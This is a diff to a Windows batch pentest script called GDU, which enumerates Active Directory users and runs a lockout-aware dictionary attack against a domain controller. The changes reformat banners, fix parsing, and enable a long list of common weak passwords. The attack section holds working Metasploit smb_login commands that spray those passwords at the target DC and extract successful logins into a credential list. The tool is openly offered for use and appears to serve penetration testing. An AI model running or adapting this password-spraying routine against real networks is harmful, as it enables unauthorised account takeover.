@@ -44,8 +44,6 @@ REM #################################################################
 REM -----------------------------------------------------------------
 REM TODO
 REM -----------------------------------------------------------------
-REM - fix width of header to match longest lengh of text
-REM - make inprogress password display pretty 
 REM - add gda option that supports auth
 REM - dumpsec - on first success stop and move on
 REM - enum - on first success stop and move on
@@ -53,7 +51,6 @@ REM - add express option (stops after first successfull enumeration)
 REM - Add check for required executables before running
 REM - add null base/bind to ldap to run when null smb login session runs
 REM -----------------------------------------------------------------
-
 
 REM -------------------------------------------------------
 REM PRE RUN CONFIGURATION OPTIONS
@@ -82,34 +79,39 @@ IF [%1] equ [-t] goto :TRUSTEDCON
 
 
 :SYNTAX
-ECHO ------------------------------------------------------------------------------------
-ECHO                                GET DOMAIN USERS (GDU)
-ECHO ------------------------------------------------------------------------------------
-ECHO  This script is intended to automate Windows domain user enumeration using multiple 
-ECHO  methods (LDAP,RPC,and SNMP). It also includes options to automatically initiate a 
-ECHO  dictionary attack against enumerated accounts under the constraints of the acccount 
-ECHO  lockout policy. 
-ECHO ------------------------------------------------------------------------------------
-ECHO  Syntax: gdu [options]
 ECHO.
-ECHO   -n run the script with null smb login
-ECHO   -t run the script with a trusted connection (current user)
-ECHO   -a run script as an authenticated user
-ECHO   -u user name to authenticate with
-ECHO   -p password to authenticate with
-ECHO   -c custom domain
-ECHO ------------------------------------------------------------------------------------
-ECHO  Examples (basic):
+ECHO  ====================================================================================
+ECHO           GET DOMAIN USERS (GDU) - Author: scott.sutherland@netspi.com (nullbind)
+ECHO  ====================================================================================
+ECHO.
+ECHO   This script is intended to automate Windows domain user enumeration using multiple 
+ECHO   methods (LDAP,RPC,and SNMP). It also includes options to automatically initiate a 
+ECHO   dictionary attack against enumerated accounts under the constraints of the acccount 
+ECHO   lockout policy. 
+ECHO.
+ECHO   Syntax: gdu [options]
+ECHO.
+ECHO   Options:
+ECHO.
+ECHO    -n Authenticate with a null SMB login
+ECHO    -t Authenticate with a trusted connection (current user)
+ECHO    -a Authenticate with a supplied credentials
+ECHO    -u user name to authenticate with
+ECHO    -p password to authenticate with
+ECHO    -c custom domain
+ECHO.
+ECHO   Examples (basic):
 ECHO. 
-ECHO   gdu -n 							
-ECHO   gdu -t
-ECHO   gdu -a -u "domain\user" -p password
+ECHO    gdu -n 							
+ECHO    gdu -t
+ECHO    gdu -a -u "domain\user" -p password
 ECHO.
-ECHO  Examples (custom domain):
+ECHO   Examples (custom domain):
 ECHO.
-ECHO   gdu -n -c domain.com							
-ECHO   gdu -t -c domain.com
-ECHO   gdu -a -u "domain\user" -p password -c domain.com
+ECHO    gdu -n -c domain.com							
+ECHO    gdu -t -c domain.com
+ECHO    gdu -a -u "domain\user" -p password -c domain.com
+ECHO.
 GOTO :END
 
 :AUTHENTICATE
@@ -134,13 +136,11 @@ SET attack=N && GOTO :DHCP
 :DHCP
 REM ## DISPLAY BANNER
 cls
-ECHO ------------------------------------------------------------------------------------
-ECHO -                                                          						-
-ECHO -                              GET DOMAIN USERS (GDU)                 			    -
-ECHO -                                                          						-
-ECHO ------------------------------------------------------------------------------------
+ECHO  ====================================================================================
+ECHO           GET DOMAIN USERS (GDU) - Author: scott.sutherland@netspi.com (nullbind)
+ECHO  ====================================================================================
 ECHO                               Enumerating Domain Users                 
-ECHO ------------------------------------------------------------------------------------
+ECHO  ------------------------------------------------------------------------------------
 REM -------------------------------------------------------
 REM GET CURRENT DOMAIN FROM IPCONFIG DHCP CONFIGURATION
 REM -------------------------------------------------------
@@ -500,9 +500,9 @@ GOTO :END
 REM -------------------------------------------------------
 REM ATTEMPT DICTIONARY ATTACK AGAINST DC
 REM -------------------------------------------------------
-ECHO ------------------------------------------------------------------------------------
+ECHO  ------------------------------------------------------------------------------------
 ECHO                                Starting Dictionary Attack 
-ECHO ------------------------------------------------------------------------------------
+ECHO  ------------------------------------------------------------------------------------
 REM ## GET DATE
 FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i
 
@@ -531,50 +531,50 @@ touch list_pending.txt
 ECHO companyname>> list_pending.txt
 ECHO Companyname>> list_pending.txt
 ECHO !!getitdone!!>> list_pending.txt
-REM ECHO Companyname1>> list_pending.txt
-REM ECHO companyname1>> list_pending.txt
-REM EcHO Companyname12>> list_pending.txt
-REM EcHO companyname12>> list_pending.txt
-REM ECHO Password>> list_pending.txt
-REM ECHO password>> list_pending.txt
-REM ECHO Password1>> list_pending.txt
-REM ECHO password1>> list_pending.txt
-REM ECHO P@ssw0rd1>> list_pending.txt
-REM ECHO Password12>> list_pending.txt
-REM ECHO password123>> list_pending.txt
-REM ECHO Password123>> list_pending.txt
-REM ECHO 12345>> list_pending.txt
-REM ECHO 123456>> list_pending.txt
-REM ECHO 654321>> list_pending.txt
-REM ECHO 1234567>> list_pending.txt
-REM ECHO 12345678>> list_pending.txt
-REM ECHO 123456789>> list_pending.txt
-REM ECHO 1234asdf>> list_pending.txt
-REM ECHO Summer2011>> list_pending.txt
-REM ECHO Fall2011>> list_pending.txt
-REM ECHO Winter2011>> list_pending.txt
-REM ECHO Winter2012>> list_pending.txt
-REM ECHO Spring2012>> list_pending.txt
-REM ECHO qwerty>> list_pending.txt
-REM ECHO Qwerty>> list_pending.txt
-REM ECHO abc123>> list_pending.txt
-REM ECHO letmein>> list_pending.txt
-REM ECHO opensesme>> list_pending.txt
-REM ECHO monkey>> list_pending.txt
-REM ECHO Monkey>> list_pending.txt
-REM ECHO myspace1>> list_pending.txt
-REM ECHO link182>> list_pending.txt
-REM ECHO liverpool>> list_pending.txt
-REM ECHO iloveyou>> list_pending.txt
-REM ECHO rockyou>> list_pending.txt
-REM ECHO princess>> list_pending.txt
-REM ECHO thomas>> list_pending.txt
-REM ECHO Nicole>> list_pending.txt
-REM ECHO Daniel>> list_pending.txt
-REM ECHO babygirl>> list_pending.txt
-REM ECHO michael>> list_pending.txt
-REM ECHO Ashley>> list_pending.txt
-REM ECHO yuiop>> list_pending.txt
+ECHO Summer2012>> list_pending.txt
+ECHO Fall2011>> list_pending.txt
+ECHO Winter2011>> list_pending.txt
+ECHO Winter2012>> list_pending.txt
+ECHO Spring2012>> list_pending.txt
+ECHO Companyname1>> list_pending.txt
+ECHO companyname1>> list_pending.txt
+EcHO Companyname12>> list_pending.txt
+EcHO companyname12>> list_pending.txt
+ECHO Password>> list_pending.txt
+ECHO password>> list_pending.txt
+ECHO Password1>> list_pending.txt
+ECHO password1>> list_pending.txt
+ECHO P@ssw0rd1>> list_pending.txt
+ECHO Password12>> list_pending.txt
+ECHO password123>> list_pending.txt
+ECHO Password123>> list_pending.txt
+ECHO 12345>> list_pending.txt
+ECHO 123456>> list_pending.txt
+ECHO 654321>> list_pending.txt
+ECHO 1234567>> list_pending.txt
+ECHO 12345678>> list_pending.txt
+ECHO 123456789>> list_pending.txt
+ECHO 1234asdf>> list_pending.txt
+ECHO qwerty>> list_pending.txt
+ECHO Qwerty>> list_pending.txt
+ECHO abc123>> list_pending.txt
+ECHO letmein>> list_pending.txt
+ECHO opensesme>> list_pending.txt
+ECHO monkey>> list_pending.txt
+ECHO Monkey>> list_pending.txt
+ECHO myspace1>> list_pending.txt
+ECHO link182>> list_pending.txt
+ECHO liverpool>> list_pending.txt
+ECHO iloveyou>> list_pending.txt
+ECHO rockyou>> list_pending.txt
+ECHO princess>> list_pending.txt
+ECHO thomas>> list_pending.txt
+ECHO Nicole>> list_pending.txt
+ECHO Daniel>> list_pending.txt
+ECHO babygirl>> list_pending.txt
+ECHO michael>> list_pending.txt
+ECHO Ashley>> list_pending.txt
+ECHO yuiop>> list_pending.txt
  
 REM ## Get number of passwords to be used
 wc -l  list_pending.txt | sed -e "s/^[ \]*//" | sed s/list_pending.txt//g> pwcount
@@ -604,7 +604,7 @@ REM ## PRINT DICTIONARY CONFIGURATION INFO
 ECHO  [*]    INFO: %targetdc% loaded as target
 ECHO  [*]    INFO: %pwcount% passwords loaded 
 ECHO  [*]    INFO: %user_count%users loaded
-ECHO  [*]    INFO: %lockoutafter% attempts can be made before accounts lockout
+ECHO  [*]    INFO: %lockoutafter%attempts can be made before accounts lockout
 ECHO  [*]    INFO: %countreset% is the lockout counter reset time
 ECHO  [*]    INFO: %attempts% passwords will be tested every %countreset% minutes
 ECHO  [*]  ACTION: Starting dictionary attack (takes a while)...
@@ -614,16 +614,16 @@ ECHO  [*]  ACTION: Testing for blank passwords and username as password...
 ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=TRUE USER_AS_PASS=TRUE USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1>> creds.txt
 
 REM ## SHOW AQUIRED PASSWORDS FOR ROUND
-ECHO  [*]  ACTION: Potentially recover passwords:
-grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 } >>tmp_list.txt
-FOR /F "tokens=*" %%i in ('type tmp_list.txt') do echo ECHO  [*] Account:%%i 
+ECHO  [*]  ACTION: Recovered passwords:
+grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15}" >>tmp_list.txt
+FOR /F "tokens=*" %%i in ('type tmp_list.txt') do ECHO  [*] ACCOUNT:%%i 
 IF EXIST tmp_list.txt DEL tmp_list.txt
 
+:RUN
 REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY
 ECHO  [*]  ACTION: Waiting for counter to reset (%countreset% minutes)...
 sleep %countreset%m
 
-:RUN
 REM ## SETUP PASSWORD FILES FOR SCAN
 head -n %attempts% list_pending.txt > list_targets.txt
 head -n %attempts% list_pending.txt >> list_scanned.txt
@@ -637,14 +637,10 @@ REM ## EXECUTE DICTIONARY ATTACK
 ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE PASS_FILE=%mydir%\\list_targets.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1>> creds.txt
 
 REM ## SHOW AQUIRED PASSWORDS FOR ROUND
-ECHO  [*]  ACTION: Potentially recover passwords:
-grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 } >>tmp_list.txt
-FOR /F "tokens=*" %%i in ('type tmp_list.txt') do echo ECHO  [*] Account:%%i 
+ECHO  [*]  ACTION: Recovered passwords:
+grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15}" >>tmp_list.txt
+FOR /F "tokens=*" %%i in ('type tmp_list.txt') do ECHO  [*] ACCOUNT: %%i 
 IF EXIST tmp_list.txt DEL tmp_list.txt
-
-REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY
-ECHO  [*]  ACTION: Waiting for counter to reset (%countreset% minutes)...
-sleep %countreset%m
 
 REM ## GET LINE COUNT OF LIST_PENDING.TXT
 wc -l list_pending.txt | sed s/list_pending.txt//g | sed -e "s/^[ \]*//" > line_count
@@ -675,10 +671,10 @@ REM ## CHECK FOR FAILURE
 IF %cred_count% EQU 0 ECHO  [*]  RESULT: No weak passwords were found && goto :END
 
 REM ## PRINT NUMBER OF CREDETIALS RECOVERED
-ECHO  [*]   RESULT: %cred_count% passwords were found
+ECHO  [*]  RESULT: %cred_count%passwords were recovered
 
 REM ## PRINT CREDENTIALS
-FOR /F "tokens=*" %i in ('type domain_passwords.txt') do ECHO  [*]  ACCOUNT:%%i
+FOR /F "tokens=*" %%i in ('type domain_passwords.txt') do ECHO  [*] ACCOUNT: %%i
 
 REM ## GET DATE
 FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i
@@ -690,7 +686,8 @@ REM ## PRINT THE END TIME
 ECHO  [*]    INFO: END TIME is %mydate% %mytime%
 
 :END
-ECHO ------------------------------------------------------------------------------------
+ECHO  ------------------------------------------------------------------------------------
+ECHO.
 REM ## CLEAN UP FILES
 IF EXIST list_pending.txt del list_pending.txt
 IF EXIST dcs.txt del dcs.txt
